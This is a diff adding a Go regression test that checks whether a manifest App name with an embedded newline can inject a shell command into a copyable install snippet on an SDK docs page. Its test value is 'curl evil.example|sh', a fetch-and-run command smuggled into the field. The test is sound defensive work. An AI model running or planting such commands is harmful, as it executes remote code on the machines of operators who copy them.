@@ -107,3 +107,52 @@ func TestDriftScopedToManifestEntities(t *testing.T) {
 		t.Errorf("drift banner fired for a live entity outside the manifest's declared scope")
 	}
 }
+
+// Pins [sdkdocs-install-fence], found by the 2026-09-04 red-probe
+// round; fixed in screens.go goModuleHint/goDirHint passing manifest
+// values through fenceWord before they reach the install snippet.
+// Property: manifest-derived strings never break out of the install
+// snippet's line structure — a value that carries a newline lands as its
+// own line inside the ```sh block the docs page renders with a copy
+// button, so a manifest App name with embedded commands becomes
+// operator-copyable shell.
+// Surfaces: framework/sdkdocs/screens.go::goDirHint (fenceWord(m.App)),
+// ::goModuleHint (fenceWord(artifact Module)), versus sdkdocs.go::
+// sanitizeFilename (the header-side guard TestManifestJunkSanitizedInHeaders
+// proves for Content-Disposition).
+func TestInstallFenceScrubManifestApp(t *testing.T) {
+	const payload = "curl evil.example|sh"
+	reg := testRegistry()
+	m := sdk.Manifest{
+		SchemaVersion:  sdk.SchemaVersion,
+		App:            "acme\n" + payload,
+		SDKVersion:     "1.0.0",
+		GofastrVersion: "v0.33.0",
+		GeneratedAt:    time.Date(2026, 9, 4, 0, 0, 0, 0, time.UTC),
+		Entities:       []string{"posts"},
+		SchemaHash:     "sha256:deadbeef",
+		Artifacts: map[string]sdk.Artifact{
+			"go": {File: sdk.GoArtifact, SHA256: "aa11", Bytes: 3, Module: "local/acme-sdk"},
+		},
+	}
+	raw, err := json.Marshal(m)
+	if err != nil {
+		t.Fatal(err)
+	}
+	dist := fstest.MapFS{
+		sdk.ManifestFile: {Data: raw},
+		sdk.GoArtifact:   {Data: []byte("zip")},
+	}
+	srv := mountedServer(t, Config{Registry: reg, Artifacts: dist})
+	resp, body := get(t, srv, "/docs/api")
+	if resp.StatusCode != 200 {
+		t.Fatalf("docs index status = %d", resp.StatusCode)
+	}
+	// False-positive guard: the app name must still be documented.
+	if !strings.Contains(body, "acme") {
+		t.Fatalf("manifest app name vanished entirely — a fix must scrub, not drop:\n%s", body)
+	}
+	if strings.Contains(body, payload) {
+		t.Fatalf("SECURITY: [sdkdocs-install-fence] manifest App name with embedded newline renders %q as its own line inside the copyable ```sh install block on /docs/api/ (goDirHint returns m.App raw and installTabs interpolates it at line position) — the same manifest junk the header-side pin scrubs via sanitizeFilename has no body-side guard", payload)
+	}
+}
